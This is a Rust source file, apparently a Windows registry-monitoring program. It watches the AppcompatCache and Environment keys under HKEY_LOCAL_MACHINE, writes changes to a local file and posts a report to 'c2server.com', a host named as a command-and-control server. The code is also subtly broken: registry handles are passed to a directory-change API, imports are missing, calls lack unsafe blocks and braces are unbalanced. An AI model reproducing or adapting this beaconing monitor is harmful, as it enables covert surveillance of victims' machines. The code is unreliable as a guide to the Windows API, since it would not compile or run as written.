extern crate winapi;
extern crate winreg;
extern crate reqwest;

use std::ffi::OsString;
use std::fs::File;
use std::io::Write;
use std::time::Duration;
use winapi::shared::minwindef::{DWORD, FALSE, LPVOID, TRUE};
use winapi::shared::ntdef::{HANDLE, NULL};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::minwinbase::{OVERLAPPED, SECURITY_ATTRIBUTES};
use winapi::um::synchapi::CreateEventA;
use winapi::um::winnt::{EVENT_MODIFY_STATE, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE, OBJ_INHERIT, OPEN_EXISTING};
use winapi::um::winreg::{HKEY_LOCAL_MACHINE, KEY_NOTIFY, KEY_QUERY_VALUE, REGSAM, RegCloseKey, RegOpenKeyExA, RegQueryInfoKeyA};
use winreg::enums::{HKEY, REG_NOTIFY_CHANGE_NAME};
use winapi::um::fileapi::{CreateFileA, ReadDirectoryChangesW};

const BUF_SIZE: DWORD = 1024;
const REG_PATHS: [&str; 2] = [
    r"System\CurrentControlSet\Control\Session Manager\AppcompatCache",
    r"System\CurrentControlSet\Control\Session Manager\Environment",
];

fn main() {
    // create a security attribute to allow inheritance
    let sa = SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as DWORD,
        lpSecurityDescriptor: NULL,
        bInheritHandle: TRUE,
    };

    // create the event object
    let event = CreateEventA(&sa, FALSE, FALSE, NULL);
    if event == INVALID_HANDLE_VALUE {
        panic!("Error creating event");
    }

    // open the registry keys for monitoring
    let mut hkeys = Vec::new();
    for path in REG_PATHS.iter() {
        let hkey = unsafe { RegOpenKeyExA(HKEY_LOCAL_MACHINE, path.as_ptr() as *const i8, 0, KEY_NOTIFY | KEY_QUERY_VALUE, &mut 0) };
        if hkey == INVALID_HANDLE_VALUE {
            panic!("Error opening registry key");
        }
        hkeys.push(hkey);
    }

    // create the overlapped structure
    let mut overlapped = OVERLAPPED {
        Internal: 0,
        InternalHigh: 0,
        Offset: 0,
        OffsetHigh: 0,
        hEvent: event,
    };

    loop {
        // wait for a change in the registry keys
        let mut buf = [0u8; BUF_SIZE as usize];
        let mut bytes = 0;
        let mut subkeys = 0;
        let mut values = 0;
        let mut max_subkey_len = 0;
        let mut max_value_name_len = 0;
        let mut max_value_len = 0;
        let mut sec_descriptor = 0;
        let mut last_write_time = winapi::shared::minwindef::FILETIME { dwLowDateTime: 0, dwHighDateTime: 0 };
        for hkey in hkeys.iter() {
        let result = unsafe { RegQueryInfoKeyA(*hkey, NULL, NULL, NULL, &mut subkeys, &mut max_subkey_len, NULL, &mut values, &mut max_value_name_len, &mut max_value_len, &mut sec_descriptor, &mut last_write_time) };
        if result != 0 {
          panic!("Error querying registry key");
        }
        let result = unsafe { ReadDirectoryChangesW(*hkey as HANDLE, buf.as_mut_ptr() as LPVOID, BUF_SIZE, TRUE, REG_NOTIFY_CHANGE_NAME, &mut bytes, &mut overlapped, NULL) };
        if result == FALSE {
          panic!("Error reading registry key changes");
        }
          
        // wait for the event to be signaled
        let result = unsafe { WaitForSingleObject(event, INFINITE) };
        if result != 0 {
            panic!("Error waiting for event");
        }

        // write the registry key changes to the text file
        let mut file = match File::create("registry_changes.txt") {
            Ok(file) => file,
            Err(e) => {
                println!("Error creating file: {}", e);
                continue;
            }
        };
        let _ = file.write_all(&buf[..bytes as usize]);
        let client = reqwest::Client::new();
        let _ = client.post("http://c2server.com/report").send();
}
}
